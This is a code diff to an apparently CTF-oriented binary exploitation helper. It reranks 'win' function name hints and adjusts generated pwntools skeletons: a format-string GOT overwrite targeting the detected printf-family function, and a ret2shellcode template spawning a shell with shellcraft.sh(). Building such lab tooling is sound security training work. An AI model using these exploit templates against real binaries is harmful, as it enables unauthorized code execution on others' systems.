@@ -22,7 +22,8 @@ from pwnable_lab.analyzer.vuln_scan import CallSite, Finding, scan_vulns
 from pwnable_lab.elf.parser import ElfImage
 
 # 로컬 "win"/셸 함수 후보로 볼 이름 조각 (libc 심볼과 구분하기 위해 로컬 정의만 사용).
-_WIN_NAME_HINTS = (
+# 강한 힌트(셸/플래그 의미가 뚜렷)는 약한 힌트보다 우선 선택된다.
+_WIN_NAME_HINTS_STRONG = (
     "win",
     "flag",
     "shell",
@@ -31,16 +32,19 @@ _WIN_NAME_HINTS = (
     "get_shell",
     "give_shell",
     "giveshell",
+    "print_flag",
+    "read_flag",
+    "cat_flag",
+    "callme",
+)
+_WIN_NAME_HINTS_WEAK = (
     "spawn",
     "magic",
     "secret",
     "admin",
     "system_call",
-    "callme",
-    "print_flag",
-    "read_flag",
-    "cat_flag",
 )
+_WIN_NAME_HINTS = _WIN_NAME_HINTS_STRONG + _WIN_NAME_HINTS_WEAK
 # 오프셋(입력 버퍼)이 저장되는 인자 레지스터를 함수별로 지정.
 _BUFFER_ARGUMENT = {
     "gets": ("rdi", "stack_arg_0"),
@@ -193,7 +197,15 @@ def _win_functions(image: ElfImage) -> list[tuple[str, int]]:
         lowered = symbol.name.lower()
         if any(hint in lowered for hint in _WIN_NAME_HINTS):
             seen.setdefault(symbol.name, symbol.addr)
-    return sorted(seen.items(), key=lambda item: item[1])
+
+    def _rank(name: str) -> int:
+        lowered = name.lower()
+        if any(hint in lowered for hint in _WIN_NAME_HINTS_STRONG):
+            return 0
+        return 1
+
+    # 강한 힌트를 먼저, 같은 티어 안에서는 주소순으로 정렬한다.
+    return sorted(seen.items(), key=lambda item: (_rank(item[0]), item[1]))
 
 
 def _find_gadget(context: _Context, pattern: list[str]) -> Gadget | None:
@@ -500,6 +512,11 @@ def _build_paths(context: _Context, primitives: list[Primitive]) -> list[AttackP
 
     # 3) format string — printf 계열 포맷 제어.
     fmt = _prim(primitives, "format_string")
+    fmt_finding = next(
+        (f for f in context.findings if f.category == "format-string" and f.call_sites),
+        None,
+    )
+    fmt_symbol = fmt_finding.symbol if fmt_finding else "printf"
     if fmt.present:
         paths.append(
             AttackPath(
@@ -532,7 +549,7 @@ def _build_paths(context: _Context, primitives: list[Primitive]) -> list[AttackP
                     if checksec.relro == "full"
                     else []
                 ),
-                pwntools=_skeleton_format_string(context),
+                pwntools=_skeleton_format_string(context, fmt_symbol),
             )
         )
 
@@ -727,15 +744,18 @@ def _skeleton_ret2system(
     return body
 
 
-def _skeleton_format_string(context: _Context) -> str:
+def _skeleton_format_string(context: _Context, fmt_symbol: str = "printf") -> str:
+    # 덮어쓸 GOT 항목은 취약 함수 자신을 우선 노린다(재호출 시 흐름 탈취).
+    got_target = fmt_symbol if fmt_symbol not in {"sprintf", "snprintf"} else "printf"
     return (
         _header(context, _arch_comment(context)) + "\n"
+        f"# 탐지된 포맷 함수: {fmt_symbol}()\n"
         "# 1) 입력이 스택 몇 번째 인자인지 offset 탐색\n"
         "# p.sendline(b'AAAA' + b'.%p' * 10)  → 41414141 이 나오는 위치가 offset\n"
         "fmt_offset = 6  # TODO: 위 방법으로 확정\n\n"
         "# 2) GOT 덮어쓰기 (Partial RELRO 이하)\n"
         "target = elf.symbols.get('win', 0x0)  # 흐름을 넘길 주소\n"
-        "payload = fmtstr_payload(fmt_offset, {elf.got['printf']: target})\n\n"
+        f"payload = fmtstr_payload(fmt_offset, {{elf.got['{got_target}']: target}})\n\n"
         "p.sendline(payload)\np.interactive()\n"
     )
 
@@ -743,12 +763,12 @@ def _skeleton_format_string(context: _Context) -> str:
 def _skeleton_ret2shellcode(
     context: _Context, offset: int | None, offset_note: str
 ) -> str:
-    reg = "sh()" if context.bits == 64 else "sh()"
     body = _header(context, _arch_comment(context)) + "\n" + offset_note + "\n\n"
     body += (
         "buf_addr = 0x0  # TODO: 셸코드가 놓이는 버퍼의 런타임 주소(비 PIE 면 고정)\n"
     )
-    body += f"shellcode = asm(shellcraft.{reg})\n\n"
+    # context.binary 로 arch 가 잡혀 shellcraft.sh() 가 알맞은 셸코드를 만든다.
+    body += "shellcode = asm(shellcraft.sh())\n\n"
     body += "payload  = shellcode.ljust(offset, b'A')\n"
     body += f"payload += p{context.bits}(buf_addr)\n"
     body += "\np.sendline(payload)\np.interactive()\n"
